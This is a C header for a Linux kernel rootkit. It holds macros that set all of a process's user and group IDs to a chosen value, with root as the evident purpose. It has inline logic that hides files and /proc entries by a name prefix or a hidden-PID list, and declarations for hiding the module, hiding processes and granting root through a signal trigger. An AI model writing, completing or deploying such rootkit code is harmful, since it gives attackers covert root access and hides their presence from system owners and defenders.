#ifndef _ROOTKIT_UTILS_H_
#define _ROOTKIT_UTILS_H_

#include "constants.h"
#include "files.h"
#include "macro_utils.h"
#include <asm/current.h>
#include <linux/kstrtox.h>
#include <linux/types.h>
#include <vdso/limits.h>

/**
 * Sets the value of a `kuid_t` variable.
 *
 * @param _kuid The `kuid_t` variable to change
 * @param _uid  The new value to set
 */
#define __SET_UID(_kuid, _uid) \
    do {                       \
        (_kuid).val = (_uid);  \
    } while (0)

/**
 * Sets the value of a `kgid_t` variable.
 *
 * @param _kgid The `kgid_t` variable to change
 * @param _gid  The new value to set
 */
#define __SET_GID(_kgid, _gid) \
    do {                       \
        (_kgid).val = (_gid);  \
    } while (0)

/**
 * Sets the value of the uid, suid, euid and fsuid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _uid     The new value to set
 */
#define __SET_UIDS(_p_creds, _uid)            \
    do {                                      \
        __SET_UID((_p_creds)->uid, (_uid));   \
        __SET_UID((_p_creds)->suid, (_uid));  \
        __SET_UID((_p_creds)->euid, (_uid));  \
        __SET_UID((_p_creds)->fsuid, (_uid)); \
    } while (0)

/**
 * Sets the value of the gid, sgid, egid and fsgid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _gid     The new value to set
 */
#define __SET_GIDS(_p_creds, _gid)            \
    do {                                      \
        __SET_GID((_p_creds)->gid, (_gid));   \
        __SET_GID((_p_creds)->sgid, (_gid));  \
        __SET_GID((_p_creds)->egid, (_gid));  \
        __SET_GID((_p_creds)->fsgid, (_gid)); \
    } while (0)

/**
 * Structure used to store the list of hidden PIDs
 */
typedef struct hidden_pid_tag {
    struct list_head list; // PID linked list
    pid_t i32_pid;         // PID to hide
} hidden_pid_t;

extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list

/**
 * Gets the effective PID for the given PID.
 * If it is 0, return the current PID.
 * If it is -1 or INT_MIN, return -1.
 * If it is < -1, return the absolute value.
 * Otherwise, return the given PID.
 *
 * @param i32_pid The PID to get the effective PID for
 * @return The effective PID
 */
static inline pid_t get_effective_pid(const pid_t i32_pid)
{
    pid_t i32_real_pid = i32_pid;

    if (i32_real_pid == 0) {
        i32_real_pid = current->pid;
    }
    else if (i32_real_pid == INT_MIN) {
        return -1;
    }
    else if (i32_real_pid < -1) {
        i32_real_pid = -i32_real_pid;
    }

    return i32_real_pid;
}

/**
 * Hides the rootkit from /proc/modules and /sys/module/
 */
void hide_module(void);

/**
 * Clear the list of hidden PIDs and free the memory
 */
void show_all_processes(void);

/**
 * Checks if the given PID is in the list of hidden PIDs.
 * If the given PID is 0, the current process is checked.
 *
 * @param i32_pid The PID to check
 * @return `true` if the given PID is in the list of hidden PIDs, `false` otherwise
 */
bool is_pid_hidden(const pid_t i32_pid);

/**
 * Does the given file name need to be hidden?
 *
 * @param s_filename      The file name to check
 * @param b_is_proc_child Is the file a child of /proc/?
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_filename_hidden(const char *const s_filename, const bool b_is_proc_child)
{
    pid_t i32_pid = 0; // PID as an integer

    // Check the name starts with the hidden prefix
    IF_U (!strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
        pr_info("[ROOTKIT] * This file name starts with the hidden prefix\n");
        return true;
    }

    // If the file is a child of /proc/, first check if its name is a number
    // If it is, check if the corresponding PID is hidden
    IF_U (b_is_proc_child) {
        // Convert the name to a number
        IF_U (kstrtoint(s_filename, 10, &i32_pid)) {
            // If the name is not a number, this is not a PID, so we can return false
            return false;
        }

        // Check if the PID is hidden
        IF_U (is_pid_hidden(i32_pid)) {
            return true;
        }
    }

    return false;
}

/**
 * Does the given file need to be hidden?
 * Checks if the file is a process file and needs to be hidden,
 * or if the file name starts with the hidden prefix.
 *
 * @param p_file The file structure to check
 * @return `true` if the given file needs to be hidden, `false` otherwise
 */
static inline bool is_file_hidden(const file_t *const p_file)
{
    pid_t i32_found_pid = -1; // PID of the process found in the path, if any

    IF_U (p_file == NULL) {
        return false;
    }

    IF_U (is_process_file(p_file, NULL, &i32_found_pid)) {
        pr_info("[ROOTKIT] * This is a process file (PID: %d)\n", i32_found_pid);

        // If the file is a process file, check if the process is hidden
        return is_pid_hidden(i32_found_pid);
    }
    else {
        pr_info("[ROOTKIT] * This is not a process file\n");
    }

    return is_filename_hidden(p_file->f_path.dentry->d_name.name, is_parent_proc_root(p_file));
}

/**
 * Elevates the current process to root
 *
 * @param i32_pid The PID that was passed to the rootkit (should be equal to SIGROOT)
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Hides the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is hidden.
 *
 * @param i32_pid The PID to hide
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long hide_process(const pid_t i32_pid, const int i32_sig);

/**
 * Shows (unhides) the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is shown.
 * If the given PID is not hidden, do nothing.
 *
 * @param i32_pid The PID to show
 * @param i32_sig The signal that was passed (currently unused)
 * @return 0 on success, otherwise an error code
 */
long show_process(const pid_t i32_pid, const int i32_sig);

#endif
